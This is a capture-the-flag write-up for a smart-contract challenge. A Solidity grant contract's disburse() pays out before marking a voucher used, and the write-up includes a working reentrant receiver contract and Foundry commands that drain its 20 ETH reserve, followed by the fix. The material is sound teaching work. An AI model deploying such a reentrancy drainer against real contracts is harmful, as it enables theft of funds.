# Standing Order — HI Cyber Con 2026

**Category:** Blockchain / Smart Contract  
**Vulnerability:** Reentrancy (SWC-107)  
**Difficulty:** Medium  
**Status:** Solved  
**Flag:** `hiCTF{REDACTED}`

## 1. Challenge Description

The challenge presents a grant program that distributes ETH through committee-approved vouchers. Two functions are responsible for processing payments:

- `acknowledge()` — handles onboarding credits.
- `disburse()` — handles committee-approved payments.

Both functions verify vouchers using the same cryptographic signature verification mechanism.

Our objective is to drain the program's reserve until less than 1% of its original balance remains.

The provided files contain the Solidity source code for `Setup.sol` and `Disbursement.sol`.

## 2. Initial Analysis

After examining `Setup.sol`, we discover the following parameters:

```solidity
uint256 public constant RESERVE = 20 ether;
uint256 public constant VOUCHER_AMOUNT = 1 ether;
uint256 public constant VOUCHER_NONCE = 0;
```

The contract initially holds 20 ETH, but we only have a committee-signed voucher authorizing a 1 ETH payment.

The win condition is implemented as:

```solidity
function isSolved() external view returns (bool) {
    return address(disbursement).balance < (RESERVE / 100);
}
```

Therefore, we need to reduce the contract's balance below 0.2 ETH.

## 3. Vulnerability Discovery

The vulnerability becomes clear when comparing the two redemption functions.

The `acknowledge()` function follows the checks-effects-interactions pattern:

```solidity
voucherUsed[digest] = true;

(bool ok,) = recipient.call{value: amount}("");
require(ok, "pay: failed");
```

Here, the voucher is marked as used **before** the ETH transfer.

However, `disburse()` performs these operations in the opposite order:

```solidity
(bool ok,) = recipient.call{value: amount}("");
require(ok, "pay: failed");

voucherUsed[digest] = true;
```

This introduces a classic reentrancy vulnerability.

When `disburse()` sends ETH to a smart contract, the recipient's `receive()` function executes before `voucherUsed[digest]` is updated.

The recipient can therefore call `disburse()` again with the same signed voucher.

Another important detail is that the signed digest is calculated using only the amount and nonce:

```solidity
return keccak256(abi.encodePacked(amount, nonce));
```

The recipient address and redemption function are not included in the signature. This allows us to direct the existing authorized payment to our exploit contract without forging a committee signature.

## 4. Exploitation

We deploy a malicious receiver contract that repeatedly calls `disburse()` whenever it receives ETH.

Our exploit uses the following logic:

```solidity
function attack(
    uint256 amount,
    uint256 nonce,
    bytes calldata sig
) external {
    voucherAmount = amount;
    voucherNonce = nonce;
    voucherSignature = sig;

    target.disburse(
        address(this),
        amount,
        nonce,
        sig
    );
}

receive() external payable {
    if (address(target).balance >= voucherAmount) {
        target.disburse(
            address(this),
            voucherAmount,
            voucherNonce,
            voucherSignature
        );
    }
}
```

The attack proceeds as follows:

1. Read the valid committee voucher from the Setup contract.
2. Deploy our malicious receiver contract.
3. Invoke `attack()` using the legitimate 1 ETH voucher.
4. The vulnerable contract transfers 1 ETH to our receiver.
5. Our `receive()` function immediately calls `disburse()` again.
6. Because the original execution has not yet updated `voucherUsed`, the voucher remains valid.
7. Repeat until the entire reserve has been transferred.

The nested calls reuse the same signed authorization without bypassing the signature verification.

## 5. Running the Exploit

We automated the exploitation using Python and Foundry (`forge` and `cast`).

The solver retrieves the instance configuration from `/info`, reads the voucher directly from the Setup contract, deploys the malicious receiver, and executes the attack.

```bash
python3 solve.py
```

The relevant transaction is sent using Foundry:

```bash
cast send "$EXPLOIT" \
  "attack(uint256,uint256,bytes)" \
  "$AMOUNT" "$NONCE" "$SIGNATURE" \
  --rpc-url "$RPC_URL" \
  --private-key "$PRIVATE_KEY" \
  --gas-limit 5000000
```

The attack reenters 20 times, transferring 1 ETH per call and emptying the 20 ETH reserve.

After the exploit, we verify the challenge condition:

```bash
cast call "$SETUP" \
  "isSolved()(bool)" \
  --rpc-url "$RPC_URL"
```

The contract returns:

```text
true
```

The challenge instance then allows retrieval of the flag through its checker.

## 6. Root Cause

The vulnerability is caused by violating the **checks-effects-interactions** pattern.

The vulnerable function performs an external interaction before updating its internal state.

Consequently, an attacker-controlled contract can recursively redeem the same authorization before the contract records its consumption.

A secure implementation should update the voucher state before transferring ETH:

```solidity
voucherUsed[digest] = true;

(bool ok,) = recipient.call{value: amount}("");
require(ok, "pay: failed");
```

A reentrancy guard can provide additional protection.

## 7. Conclusion

Standing Order demonstrates how a simple difference in execution order can compromise an otherwise valid authorization system.

The cryptographic signature mechanism itself was not broken. Instead, we exploited the fact that a voucher remained reusable during an external ETH transfer.

By combining a legitimate 1 ETH voucher with a reentrant receiver contract, we could drain the 20 ETH reserve and satisfy the challenge's win condition.

**Flag:** `hiCTF{REDACTED}`

**Key takeaway:** Always update critical state before making external calls, especially when processing financial transactions or single-use authorizations.
